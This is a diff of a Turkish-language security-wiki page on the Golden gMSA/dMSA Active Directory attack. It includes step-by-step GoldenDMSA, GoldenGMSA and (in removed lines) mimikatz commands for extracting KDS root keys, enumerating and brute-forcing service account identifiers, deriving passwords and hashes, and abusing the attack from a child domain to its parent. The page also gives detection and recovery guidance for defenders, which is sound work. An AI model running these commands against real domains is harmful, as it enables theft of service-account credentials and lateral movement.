@@ -1,121 +1,115 @@
-# Golden gMSA/dMSA Attack (Managed Service Account Parolalarının Offline Türetilmesi)
+# Golden gMSA/dMSA Attack (Managed Service Account Parolalarının Çevrimdışı Türetilmesi)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-Windows Managed Service Account'ları (MSA), parolalarını manuel olarak yönetme ihtiyacı olmadan servisleri çalıştırmak için tasarlanmış özel principal'lardır.
-İki ana çeşidi vardır:
+Windows Managed Service Accounts, yöneticinin uzun süre geçerli olan bir parolayı yönetmesine gerek kalmadan service çalıştırmak için tasarlanmış domain principals'tır:
 
-1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute'unda yetkilendirilmiş birden fazla host üzerinde kullanılabilir.
-2. **dMSA** – delegated Managed Service Account – aynı cryptography'ye dayanan ve daha ayrıntılı delegation senaryolarına olanak tanıyan, gMSA'nın (preview) halefidir.
+1. **gMSA** (group Managed Service Account), `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword` üzerinden yetkilendirilen bilgisayarlar tarafından kullanılabilir.
+2. **dMSA** (delegated Managed Service Account), **Windows Server 2025**'te kullanıma sunulmuştur. Normal authentication işlemini yetkili machine identities'ye bağlar ve bir migration workflow aracılığıyla legacy service account'un yerini alabilir.
 
-Her iki varyantta da **parola**, normal bir NT-hash gibi her Domain Controller (DC) üzerinde saklanmaz. Bunun yerine her DC mevcut parolayı anlık olarak şu bilgilerden türetebilir:
+**Golden dMSA** ile **BadSuccessor**'ı karıştırmayın. Golden dMSA, KDS root-key material'ının ele geçirilmesini ve managed-account key'lerinin türetilmesini gerektirir; [BadSuccessor](badsuccessor-dmsa-migration-abuse.md) ise bir dMSA object'i ve migration attributes'ları üzerindeki control'ü kötüye kullanır.
 
-* Forest genelindeki **KDS Root Key** (`KRBTGT\KDS`) – her DC'ye `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container'ı altında replicate edilen, rastgele oluşturulmuş GUID adlandırmalı secret.
-* Hedef account'un **SID** değeri.
-* `msDS-ManagedPasswordId` attribute'unda bulunan account'a özel **ManagedPasswordID** (GUID).
+Bir DC, her gMSA için bağımsız olarak oluşturulmuş bir clear-text password saklamaz. Password'ü bir **KDS root key**, zamana göre indekslenmiş bir Group Key Distribution Protocol (GKDI) key'i ve account SID'den türetir. Root-key object'leri `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...` altında bulunan `msKds-ProvRootKey` object'leridir; hassas değer `msKds-RootKeyData`'dır. `msDS-ManagedPasswordId` bir **GUID değildir**: KDS root-key GUID'ini, GKDI `L0`/`L1`/`L2` index'lerini ve domain/forest metadata'sını içeren binary bir key identifier'dır. DC, KDF'yi `GMSA PASSWORD` label'ı ve context olarak binary SID ile uygular, ardından bir `MSDS-MANAGEDPASSWORD_BLOB`'u yalnızca gMSA password'ünü almaya yetkili principals'lara sunar.<sup>[[2]](#references)</sup>
 
-Türetme işlemi: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → son olarak **base64-encoded** hale getirilen ve `msDS-ManagedPassword` attribute'unda saklanan 240 byte'lık blob.
-Normal parola kullanımı sırasında herhangi bir Kerberos trafiği veya domain etkileşimi gerekmez – bir member host, üç input'u bildiği sürece parolayı local olarak türetebilir.
+Bir dMSA normalde operational olarak farklıdır: secret'ın DC üzerinde kalması amaçlanır ve KDC, yetkili bir machine'a credentials verir. Ancak dMSA'ler, temel KDS/GKDI password derivation mekanizmasını yeniden kullanır. Golden dMSA bu secret'ı doğrudan yeniden oluşturur ve böylece amaçlanan machine-bound flow'u ve service host üzerindeki Credential Guard'ı bypass eder.<sup>[[1]](#references)</sup>
 
 ## Golden gMSA / Golden dMSA Attack
 
-Bir attacker üç input'un tamamını **offline** olarak elde edebilirse, DC'ye tekrar dokunmadan forest'taki **herhangi bir gMSA/dMSA için geçerli mevcut ve gelecekteki parolaları** hesaplayabilir ve şunları bypass edebilir:<sup>[[1]](#references)[[2]](#references)</sup>
-
-* LDAP read auditing
-* Password change intervals (önceden hesaplayabilirler)
-
-Bu, service account'lar için bir *Golden Ticket* analogudur.<sup>[[1]](#references)[[2]](#references)</sup>
+Bir KDS root key'i extract ettikten sonra saldırgan, `msDS-ManagedPassword`'ı okumadan bu key'e bağlı account'lar için password türetebilir. Bu işlem, account başına uygulanan password-retrieval ACL'sini bypass eder ve ele geçirilmiş root key kullanılmaya devam ettiği sürece olağan managed-password rotation işlemlerinden etkilenmez. gMSA'ler için okunabilir `msDS-ManagedPasswordId` normalde tam key identifier'ını sağlar. ACL ile kısıtlanmış dMSA'ler için Golden dMSA, eksik identifier'ı yalnızca **1.024 aday** seviyesine indirir.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Ön Koşullar
 
-1. **Bir DC'nin forest-level compromise edilmesi** (veya Enterprise Admin) ya da forest'taki DC'lerden birine `SYSTEM` erişimi.
-2. Service account'ları enumerate etme yeteneği (LDAP read / RID brute-force).
-3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) veya eşdeğer code'u çalıştırmak için .NET ≥ 4.7.2 x64 workstation.<sup>[[3]](#references)</sup>
+* Genellikle Enterprise Admin / forest-root Domain Admin haklarıyla, bir DC üzerindeki `SYSTEM` ile ya da exposed bir DC database veya backup'tan elde edilen ilgili KDS root-key object'i.<sup>[[1]](#references)[[2]](#references)</sup>
+* Hedef account'un SID'i, DNS domain'i, forest name'i ve `sAMAccountName`'i.<sup>[[1]](#references)[[2]](#references)</sup>
+* Doğrudan gMSA computation için base64-encoded `msDS-ManagedPasswordId`; Golden dMSA için bunun yerine tahmin yapılabilir.<sup>[[1]](#references)[[2]](#references)</sup>
+* [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) için .NET Framework 4.7.2 yüklü bir x64 Windows host.<sup>[[3]](#references)</sup>
 
-### Golden gMSA / dMSA
-#### Phase 1 – KDS Root Key'i Extract Etme
+### Faz 1 - KDS root key'i Extract Etme
 
-Herhangi bir DC'den dump alın (Volume Shadow Copy / raw SAM+SECURITY hives veya remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
+`GoldenDMSA` ve [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA), root-key object field'larını base64 blob olarak export eder. Domain argument'ı olmadan tools, forest root'u sorgular ve uygun privileged directory access gerektirir. Domain/forest argument'ı ile bir DC üzerindeki `SYSTEM`, o DC'nin local Configuration naming-context replica'sını sorgulayabilir.<sup>[[1]](#references)[[2]](#references)</sup>
 ```cmd
-reg save HKLM\SECURITY security.hive
-reg save HKLM\SYSTEM  system.hive
-
-# With mimikatz on the DC / offline
-mimikatz # lsadump::secrets
-mimikatz # lsadump::trust /patch   # shows KDS root keys too
-
-# With GoldendMSA
-GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
+:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
 GoldendMSA.exe kds
+GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
+GoldendMSA.exe kds --domain child.example.local
 
-# With GoldenGMSA
+:: GoldenGMSA equivalents
 GoldenGMSA.exe kdsinfo
+GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
 ```
-`RootKey` (GUID adı) olarak etiketlenen base64 string'i sonraki adımlarda gereklidir.<sup>[[1]](#references)[[2]](#references)</sup>
+Hem root-key GUID'sini hem de base64 root-key blob'unu kaydedin. Bir registry `SECURITY`/`SYSTEM` hive export'u tek başına KDS root key değildir: yetkili materyal AD Configuration partition'ındadır.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Aşama 2 – gMSA / dMSA nesnelerini enumerate etme
+### Phase 2 - gMSA / dMSA nesnelerini listeleme
 
-En azından `sAMAccountName`, `objectSid` ve `msDS-ManagedPasswordId` bilgilerini alın:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# Authenticated or anonymous depending on ACLs
-Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
-Select sAMAccountName,objectSid,msDS-ManagedPasswordId
+gMSA'ler için `sAMAccountName`, `objectSid` ve binary `msDS-ManagedPasswordId` değerlerini alın. İkincisi, çağıranın `msDS-ManagedPassword` değerini alma izni olmasa bile genellikle okunabilir.<sup>[[2]](#references)</sup>
+```powershell
+Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
+Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId
 
-GoldenGMSA.exe gmsainfo
+GoldenGMSA.exe gmsainfo --domain example.local
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) yardımcı modları uygular:<sup>[[1]](#references)[[3]](#references)</sup>
-```bash
-# LDAP enumeration (kerberos / simple bind)
+Bir dMSA'nın varsayılan ACL'si, düşük ayrıcalıklı LDAP enumeration işlemini engelleyebilir. `GoldenDMSA info`, LDAP'ı sorgulayabilir veya aday RID'leri enumerate edip `\PIPE\lsarpc` üzerinden `LsaLookupSids` aracılığıyla SID'leri çözümleyebilir; ardından dMSA'ları computer accounts ve gMSA'lardan ayırt edebilir.<sup>[[1]](#references)[[3]](#references)</sup>
+```cmd
 GoldendMSA.exe info -d example.local -m ldap
-
-# RID brute force if anonymous binds are blocked
-GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
+GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
 ```
-##### Aşama 3 – ManagedPasswordID'yi Tahmin Etme / Keşfetme (eksik olduğunda)
+### Aşama 3 - `msDS-ManagedPasswordId` değerini yeniden oluşturma veya tahmin etme
 
-Bazı dağıtımlar, ACL-korumalı okumalarda `msDS-ManagedPasswordId` değerini *strip* eder.
-GUID 128 bit olduğundan naif bruteforce uygulanabilir değildir, ancak:
+Anahtar tanımlayıcı, rastgele bitlerin izlediği bir hesap oluşturma zaman damgasını değil, `L0Index`, `L1Index` ve `L2Index` değerlerini içerir. Semperis, parola oluşturma yolunun aday `L0Index` değerini kullanmadığını, `L1Index` ve `L2Index` değerlerinin ise her birinin `0..31` aralığındaki değerlerle sınırlı olduğunu tespit etti. Sonuç olarak root-key GUID, domain, forest ve SID değerlerini bilen bir saldırgan, `32 * 32 = 1,024` aday tanımlayıcının tamamını oluşturabilir.<sup>[[1]](#references)</sup>
+```cmd
+:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
+GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID
 
-1. İlk **32 bit = hesabın oluşturulma zamanının Unix epoch zamanı** (dakika çözünürlüğünde).
-2. Ardından 96 rastgele bit gelir.
-
-Bu nedenle her hesap için **dar bir wordlist** (birkaç saatlik ± aralık) gerçekçidir.
-```bash
-GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
+:: Derive and validate candidates; -t caches the successful TGT
+GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
 ```
-Araç, aday parolaları hesaplar ve base64 blob'larını gerçek `msDS-ManagedPassword` attribute'u ile karşılaştırır; eşleşme doğru GUID'yi ortaya çıkarır.
+Türetimler çevrimdışı yapılır, ancak geçerli adayı belirlemek genellikle authentication denemeleri gerektirir. Bu durum, geçerli anahtar bulunmadan önce bir dizi başarısız Kerberos pre-authentication veya NTLM validation işlemi oluşturabilir. AES Kerberos anahtarları için tool tarafından kullanılan managed-account salt değeri, `UPPERCASE.DNS.DOMAIN` + `host` + sondaki `$` karakteri çıkarılmış, küçük harfli hesap UPN'sinden oluşur (örneğin, `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>
 
-##### Phase 4 – Offline Password Computation & Conversion
+### Aşama 4 - Parolayı hesaplama ve kullanma
 
-ManagedPasswordID bilindiğinde, geçerli parola tek bir komutla elde edilir:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# derive base64 password
-GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
-GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
+Tam identifier biliniyorsa 256 baytlık password buffer'ı hesaplayın ve bunu NTLM/AES materyaline dönüştürün. Bu tool'ların yazdırdığı base64 değeri, LDAP `MSDS-MANAGEDPASSWORD_BLOB`'un kendisi değil, encode edilmiş password buffer'ıdır.<sup>[[2]](#references)[[3]](#references)</sup>
+```cmd
+GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
+GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD
+
+GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
 ```
-Ortaya çıkan hash'ler **mimikatz** (`sekurlsa::pth`) veya Kerberos abuse için **Rubeus** ile enjekte edilebilir; bu da gizli **lateral movement** ve **persistence** sağlar.
+NTLM sonucu, NTLM'nin kabul edildiği yerlerde kullanılabilir; AES anahtarı ise yönetilen hesap yalnızca AES kullandığında pass-the-hash üzerinden geçiş / TGT istekleri için kullanılabilir. Bu, saldırganın makinesini `PrincipalsAllowedToRetrieveManagedPassword` öğesine eklemeden, ele geçirilen managed service account'ın ayrıcalıklarını, SPN'lerini, delegation yapılandırmasını ve kaynak erişimini sağlar.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Tespit ve Azaltma
+### Cross-domain Configuration-partition abuse
 
-* **DC backup and registry hive read** yeteneklerini Tier-0 yöneticileriyle sınırlandırın.
-* DC'lerde **Directory Services Restore Mode (DSRM)** veya **Volume Shadow Copy** oluşturulmasını izleyin.
-* `CN=Master Root Keys,…` okumalarını/değişikliklerini ve service account'ların `userAccountControl` flag'lerini denetleyin.
-* Olağandışı **base64 password writes** veya host'lar arasında service password'ların aniden yeniden kullanılmasını tespit edin.
-* Tier-0 izolasyonunun mümkün olmadığı durumlarda, yüksek ayrıcalıklı gMSA'ları düzenli ve rastgele rotation uygulanan **classic service accounts**'lara dönüştürmeyi değerlendirin.
+KDS root-key nesneleri, child domain'lerdeki DC'lere çoğaltılan forest Configuration naming context içinde bulunur. Sonuç olarak, bir child-domain DC'si üzerindeki `SYSTEM`, forest-root DC'sinden nesneyi doğrudan okuyamasa da child DC'nin yerel replikasından forest-root KDS materyalini okuyabilir. Saldırgan bir parent-domain gMSA'sinin `msDS-ManagedPasswordId` değerini de okuyabiliyorsa, GoldenGMSA bu parent hesabın parolasını hesaplayabilir; SID filtering bu cryptographic saldırıyı engellemez.<sup>[[5]](#references)</sup>
+```cmd
+:: Run as SYSTEM on a child.example.local DC
+GoldenGMSA.exe kdsinfo --forest child.example.local
+
+:: Query target metadata in the parent, then combine both inputs
+GoldenGMSA.exe gmsainfo --domain example.local
+GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
+```
+## Tespit, Sınırlama ve Kurtarma
+
+* Başarılı `msKds-RootKeyData` okumaları için, `msKds-ProvRootKey` nesneleri tarafından devralınan **Master Root Keys** kapsayıcısında bir SACL yapılandırın. Directory Service Access auditing etkinleştirildiğinde, online extraction Security event **4662** oluşturur; beklenen DC'ler veya Tier-0 operatörleri olmayan özneleri araştırın. Ayrıca bu SACL'lerdeki ve root-key nesnesi ACL'lerindeki değişiklikleri de audit edin.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
+* Child-to-parent attack, KDS nesnesini ele geçirilmiş child DC'nin yerel replica'sından okur; bu nedenle forest-root domain bu okumayı gözlemlemeyebilir. Parent domain'de, `msDS-GroupManagedServiceAccount` nesneleri üzerindeki `msDS-ManagedPasswordId` (schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`) okumalarını başarılı şekilde audit edin ve başka bir domain'deki principal'lar tarafından yapılan okumaları araştırın.<sup>[[5]](#references)</sup>
+* KDS nesnesi erişimini, managed account'lar tarafından gerçekleştirilen olağandışı logon'lar ve `$` soneki taşıyan service account'lar için Kerberos/NTLM failure artışlarıyla ilişkilendirin. Önceki database/backup theft sonrasında gerçekleştirilen offline computation, canlı bir DC'de görünür değildir.<sup>[[1]](#references)[[3]](#references)</sup>
+* Root-key exposure sonrasında sıradan password rotation yeterli değildir. Microsoft'un mevcut recovery procedure'ü yeni bir KDS root key oluşturur, ilgili tüm DC'lerde KDS'yi yeniden başlatır ve etkilenen account'ları bu key'e taşır. Exposure kapsamı/zamanı bilinmiyorsa ve güvenli bir roll beklemek kabul edilemezse, compromised key'i kullanan her gMSA'yı değiştirin; kapsam biliniyorsa Microsoft, güvenli rolling'i zorlamak için authoritative-restore workflow'ünü belgeler. Eski key'i silmeden önce yeni key GUID'sini `msDS-ManagedPasswordId` içinde doğrulayın.<sup>[[4]](#references)</sup>
+* DC database ve backup erişimini, Configuration-partition replication'ı ve KDS root-key administration'ı Tier-0 olarak ele alın. `ManagedPasswordIntervalInDays` değerini azaltmak bazı recovery window'larını sınırlar, ancak zaten compromised olan bir root key'i revoke etmez.<sup>[[4]](#references)</sup>
 
 ## Tooling
 
-* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – bu sayfada kullanılan referans implementasyon.<sup>[[3]](#references)</sup>
-* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – bu sayfada kullanılan referans implementasyon.
-* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – türetilen AES key'lerini kullanarak pass-the-ticket.
+* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - dMSA/gMSA enumeration, identifier generation, 1,024-candidate validation, password computation ve NTLM/AES conversion.<sup>[[3]](#references)</sup>
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - gMSA/KDS enumeration ve online, offline ve cross-domain password computation.<sup>[[2]](#references)</sup>
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) ve [`Impacket`](https://github.com/fortra/impacket) - derived NTLM/AES key'lerini authorised testing kapsamında kullanın veya doğrulayın.
 
-## Referanslar
 
-- [1] [Golden dMSA – delegated Managed Service Accounts için authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+
+## References
+
+- [1] [Golden dMSA - delegated Managed Service Accounts için authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [gMSA Active Directory Attacks](https://www.semperis.com/blog/golden-gmsa-attack/)
 - [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
-
+- [4] [Microsoft - Golden gMSA attack sonrasında nasıl recovery yapılır](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
+- [5] [SID filter as security boundary between domains? Part 5 - Golden gMSA trust attack](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
 {{#include ../../banners/hacktricks-training.md}}
